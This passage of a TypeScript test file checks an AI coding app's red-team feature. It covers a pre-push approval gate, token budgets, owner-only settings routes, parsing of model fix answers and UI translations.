  assert.equal(app.requests.length, calls + 1, 'one model call, none past the budget');
  assert.equal(r.reviewer.ran, false);
  assert.equal(r.reviewer.note, 'budget');
  assert.ok(r.budget.usedTokens <= 10_000 + 200);
  assert.ok(r.tried.probes > 10, 'the fixed catalogue ran');
  assert.ok(r.breaks.some((b) => b.entry === 'GET /sum'), 'code-found breaks still count (reproduced, quoted)');
  assert.deepEqual(app.runs!.get(r.runId!)!.budget, { tokens: 10_000, minutes: 5 });
});

test('a fix answer with real line breaks inside its JSON strings is still read (small local models do this)', () => {
  const answer = '```json\n{"edits":[{"file":"server.js","find":"  const items = req.query.items.split(\',\');\n","replace":"  if (typeof req.query.items !== \'string\') return res.status(400).send(\'items?\');\n\tconst items = req.query.items.split(\',\');"}],"note":"ok"}\n```';
  const j = jsonIn(answer) as { edits: { find: string; replace: string }[] };
  assert.equal(j.edits.length, 1);
  assert.match(j.edits[0].replace, /\n\tconst items/);
  assert.deepEqual(jsonIn('{"a":"b\\"c"}'), { a: 'b"c' }, 'escaped quotes untouched');
});

// ------------------------------------------------------------------------------------------------
// 6. The ship gate, settings, routes, member isolation, evals
// ------------------------------------------------------------------------------------------------

function pushTool(ran: { n: number }): Tool {
  return {
    spec: { name: 'git_push', description: 'Push', parameters: { type: 'object', properties: { branch: { type: 'string' } } } },
    defaultPermission: 'auto',
    summarize: (a) => `push ${String(a.branch ?? '')}`,
    async run() {
      ran.n++;
      return 'pushed';
    },
  };
}

async function turn(app: TestApp, convId: string, msg: string, answer: (ev: Extract<ChatEvent, { type: 'approval' }>) => [boolean, string?]): Promise<ChatEvent[]> {
  const out: ChatEvent[] = [];
  for await (const ev of runTurn(app, convId, msg)) {
    out.push(ev);
    if (ev.type === 'approval') {
      const [ok, how] = answer(ev);
      setImmediate(() => app.approvals.decide(ev.approvalId, ok, how as never));
    }
  }
  return out;
}

test('ship gate: Ask me offers Red-team first (the push does not run, a run starts); Off offers nothing; a push is recognised', { skip: !HAS_GIT }, async (t) => {
  const { app, ws, conv } = setup(t, { reviewer: false });
  writeFiles(ws, { 'index.js': 'console.log(1);\n' });
  const ran = { n: 0 };
  app.tools.add(pushTool(ran));
  assert.ok(isShipAction('git_push', {}) && isShipAction('shell', { command: 'git push origin main' }) && isShipAction('shell', { command: 'npm publish' }) && isShipAction('github_open_pr', {}));
  assert.ok(!isShipAction('shell', { command: 'git status' }) && !isShipAction('shell', { command: 'echo push' }));
  app.script.push([call('p1', 'git_push', { branch: 'main' })], text('Waiting for the red-team report.'));
  const evs = await turn(app, conv.id, 'push it', () => [false, 'redteam']);
  const ap = evs.find((e) => e.type === 'approval') as Extract<ChatEvent, { type: 'approval' }>;
  assert.equal(ap.redteam?.mode, 'ask');
  assert.equal(ran.n, 0, 'the push did not run');
  const started = evs.find((e) => e.type === 'redteam') as Extract<ChatEvent, { type: 'redteam' }>;
  assert.ok(started?.runId);
  const toolMsg = app.store.messages(conv.id).find((m) => m.role === 'tool');
  assert.match(toolMsg!.content, /red-team run #\d+ started/);
  await app.redteam!.running.get(started.runId)?.promise;
  assert.equal(app.redteam!.get(started.runId)!.reason, 'ship');
  // Ship without it: the push runs.
  app.script.push([call('p2', 'git_push', { branch: 'main' })], text('Pushed.'));
  await turn(app, conv.id, 'push it anyway', () => [true]);
  assert.equal(ran.n, 1);
  // Off: no card for an auto tool.
  app.settings.update({ redteam: { ...redteamSettings(app.settings.get()), ship: 'off' } });
  app.script.push([call('p3', 'git_push', { branch: 'main' })], text('Pushed.'));
  const off = await turn(app, conv.id, 'push again', () => [true]);
  assert.ok(!off.some((e) => e.type === 'approval'));
  assert.equal(ran.n, 2);
});

test('routes: settings (owner only), the plan, start needs the confirm, reports, scripts, fix; members and an app without it are refused; evals count the probes', { skip: !HAS_GIT }, async (t) => {
  const { app, dir, ws, conv } = setup(t, { reviewer: false });
  smallProject(ws);
  repo(ws);
  const auth = new OwnerAuth(dir, () => NOW);
  const server = createSaraServer({ app, auth, webDir: join(ROOT, 'web') });
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
  t.after(() => server.close());
  const base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  const H = { authorization: `Bearer ${auth.newToken}`, 'content-type': 'application/json' };
  const api = async (path: string, method = 'GET', body?: unknown) => {
    const r = await fetch(base + path, { method, headers: H, ...(body !== undefined ? { body: JSON.stringify(body) } : {}) });
    return { status: r.status, json: (await r.json()) as Record<string, unknown> };
  };
  const s = await api('/api/redteam');
  assert.equal(s.json.ship, 'ask');
  assert.deepEqual((s.json.choices as { ship: string[] }).ship, ['ask', 'always', 'off']);
  assert.equal((await api('/api/redteam', 'PUT', { ship: 'always', scripts: 5, budgetTokens: 100_000, minutes: 10 })).json.ship, 'always');
  assert.deepEqual(redteamSettings(app.settings.get()), { ship: 'always', scripts: 5, budgetTokens: 100_000, minutes: 10 });
  assert.equal((await api('/api/redteam', 'PUT', { ship: 'loud', scripts: 99 })).json.scripts, 5, 'unknown values keep the saved ones');
  app.settings.update({ redteam: { ship: 'ask', scripts: 0, budgetTokens: 30_000, minutes: 5 } });
  const plan = await api('/api/redteam/plan', 'POST', { conversationId: conv.id });
  assert.equal(plan.status, 200);
  assert.ok(((plan.json.plan as { entries: unknown[] }).entries).length >= 4);
  assert.equal((await api('/api/redteam', 'POST', { conversationId: conv.id })).status, 400, 'the plan is shown first: confirm needed');
  assert.equal((await api('/api/redteam/plan', 'POST', { workspace: '../x' })).status, 400);
  const st = await api('/api/redteam', 'POST', { conversationId: conv.id, confirm: true });
  assert.equal(st.status, 202);
  const id = (st.json.report as { id: number }).id;
  await app.redteam!.running.get(id)?.promise;
  const rep = await api(`/api/redteam/${id}`);
  assert.equal((rep.json.report as { status: string }).status, 'done');
  assert.equal((await api(`/api/redteam?workspace=${conv.workspace}`)).json.reports instanceof Array, true);
  assert.equal((await api(`/api/redteam/${id}/scripts`, 'POST', { approve: ['S1'] })).status, 409, 'nothing waiting');
  assert.equal((await api('/api/redteam/999999')).status, 404);
  app.providerFactory = (config) => new Brain(config, app, { fix: () => '{"edits":[]}' });
  const fx = await api(`/api/redteam/${id}/fix`, 'POST', {});
  assert.equal(fx.status, 202, JSON.stringify(fx.json));
  for (const fid of fx.json.ids as number[]) await app.fixes!.running.get(fid)?.promise;
  assert.ok(OWNER_SETTINGS.includes('redteam'));
  // Evals count the red-team insecure-default probes on the changed files (code only).
  writeFiles(ws, { 'config.json': '{ "debug": true }\n' });
  const counted = countFindings(ws, [{ path: 'config.json', change: 'added' }]);
  assert.ok(counted.list.some((x) => x.rule === 'redteam:debug-on'));
  app.redteam = undefined;
  assert.equal((await api('/api/redteam')).status, 404);
});

test('UI: settings with tips, the Red team tab, Before you ship, translations, no inline styles, the service worker cache, the docs', () => {
  const web = (f: string) => readFileSync(join(ROOT, 'web', f), 'utf8');
  const tips = JSON.parse(web('tips.json')).tips as Record<string, [string, string]>;
  const help = web('help.html');
  const html = web('index.html');
  for (const id of ['rt-ship', 'rt-scripts', 'rt-budget', 'rt-minutes']) {
    assert.ok(tips[id], id);
    assert.ok(tips[id][0].length <= 260, `${id} tip too long`);
    assert.ok(help.includes(`id="${tips[id][1]}"`), `guide section ${tips[id][1]}`);
    assert.ok(html.includes(`id="${id}"`), id);
  }
  for (const id of ['fnd-tab-redteam', 'fnd-redteam', 'pj-redteam']) assert.ok(html.includes(`id="${id}"`), id);
  assert.ok(html.includes('<option value="redteam">Red team</option>'));
  for (const lang of ['es', 'fr', 'de', 'pt-BR', 'it']) {
    const d = JSON.parse(web(`i18n/${lang}.json`)) as Record<string, string>;
    for (const k of ['Red-team this', 'Fix what broke', 'Red-team before shipping', 'Before you ship', 'What broke', 'Red-team first', 'The app stopped on unusual input']) {
      assert.ok(d[k], `${lang}: ${k}`);
      assert.notEqual(d[k], k, `${lang}: ${k} is translated`);
    }
  }
  const view = web('findings-view.js');
  assert.doesNotMatch(view, /style=|\.style\./, 'no inline styles');
  for (const k of ['exit', 'crash', 'uncaught', 'timeout', 'stack-trace', 'secret-echo', 'debug-on', 'default-credentials', 'cors-wildcard', 'missing-headers', 'listen-all', 'world-writable', 'env-committed']) assert.ok(view.includes(`'redteam:${k}'`), `the view names redteam:${k}`);
  assert.match(web('icons.js'), /target: '/);
  assert.match(web('sw.js'), /caches\.open\('sara-shell-v20'\)[\s\S]*sara-shell-v19 from 2\.18/);
  const { dir, cleanup } = tempDir();
  try {
    for (const f of ['app.js', 'findings-view.js', 'icons.js']) {
      const copy = join(dir, f.replace(/\.js$/, '.mjs'));
      writeFileSync(copy, web(f));
      const r = spawnSync(process.execPath, ['--check', copy], { encoding: 'utf8' });
      assert.equal(r.status, 0, `${f}: ${r.stderr}`);
    }
  } finally {
    cleanup();
  }
  const track = readFileSync(join(ROOT, 'docs', 'design', 'HARNESS_TRACK.md'), 'utf8');
  assert.match(track, /M11 · Phase 86[\s\S]*As built/);
  assert.match(track, /harness track is complete/i);
  assert.match(readFileSync(join(ROOT, 'docs', 'RESULTS.md'), 'utf8'), /Red team \(Phase 86\)/);
});

test('fix answers that come as several JSON objects still give their edits', async () => {
  const { jsonObjectsIn } = await import('../src/security/pass.ts');
  const text = 'Here:\n{"edits":[{"file":"server.js","find":"a","replace":"b"}]}\n{"edits":[{"file":"server.js","find":"c","replace":"d"}]}';
  const objs = jsonObjectsIn(text);
  assert.equal(objs.length, 2);
  const src = readFileSync(join(ROOT, 'src', 'security', 'fix.ts'), 'utf8');
  assert.match(src, /editsFromObjects\(text\)/);
});
